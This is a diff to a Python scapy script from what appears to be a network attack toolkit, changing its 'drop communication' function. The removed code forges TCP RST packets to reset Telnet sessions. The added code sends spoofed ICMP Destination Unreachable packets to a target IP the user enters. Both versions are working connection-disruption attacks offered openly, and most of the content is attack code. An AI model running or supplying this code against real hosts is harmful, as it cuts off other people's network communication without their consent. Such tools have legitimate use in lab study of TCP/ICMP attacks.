@@ -1,6 +1,5 @@
 from scapy.all import *
 from scapy.layers.inet import IP, UDP, TCP, ICMP
-import subprocess
 
 
 def attack_to_perform(number):
@@ -332,54 +331,26 @@ def perform_drop_communication(ip_addr=None):
         # Get input from the user
         ip_addr = input("Enter the IP address to attack: ")
 
-    cmd = "ip a | grep {} | awk '{print $7}'".format(ip_addr)
-    IFACE = subprocess.run(
-        cmd, shell=True, check=True, universal_newlines=True, stdout=subprocess.PIPE
-    ).stdout.strip()
-
     # Create a packet filter to capture packets from the specified IP address
-    filter_str = "tcp"
+    filter_str = "ip src {}".format(ip_addr)
 
     # Sniff packets and execute RST attack
     def packet_handler(packet):
-        if packet.haslayer(TCP):
-            if packet[TCP].sport == 23 or packet[TCP].dport == 23:
-                if packet.haslayer(Raw):
-                    tcp_seg_len = len(packet.getlayer(Raw).load)
-                else:
-                    tcp_seg_len = 0
+       if packet.haslayer(ICMP):
+            if packet[IP].src == ip_addr:
+                # Create an ICMP Destination Unreachable packet to drop the communication
+                drop_packet = ICMP(type=3, code=1)
 
-                # Create a TCP RST packet to reset the connection
-                rst_packet = TCP(
-                    sport=packet[TCP].sport,
-                    dport=packet[TCP].dport,
-                    flags="R",
-                    seq=packet[TCP].seq + tcp_seg_len,
-                    ack=packet[TCP].ack + tcp_seg_len,
-                )
-
-                # Send the RST packet
-                send(
-                    IP(src=packet[IP].src, dst=packet[IP].dst) / rst_packet,
-                    iface=IFACE,
-                    verbose=0,
-                )
+                # Send the ICMP Destination Unreachable packet
+                send(IP(src=packet[IP].dst, dst=packet[IP].src) / drop_packet, verbose=0)
 
                 # Print the dropped communication
-                print(
-                    "Dropped communication: Source IP: {}, Destination IP: {}, Source Port: {}, Destination Port: {}, rst_Seq: {}, rst_Ack: {}".format(
-                        packet[IP].src,
-                        packet[IP].dst,
-                        packet[TCP].sport,
-                        packet[TCP].dport,
-                        rst_packet[TCP].seq,
-                        rst_packet[TCP].ack,
-                    )
-                )
+                print("Dropped communication: Source IP: {}, Destination IP: {}, ICMP Type: {}, ICMP Code: {}".format(
+                    packet[IP].src, packet[IP].dst, packet[ICMP].type, packet[ICMP].code))
 
     # Start sniffing packets and call the packet_handler for each captured packet
     print("Start sniffing...")
-    sniff(iface=IFACE, filter=filter_str, prn=packet_handler)
+    sniff(filter=filter_str, prn=packet_handler)
 
     return "Drop communication performed on IP address: {}".format(ip_addr)
 
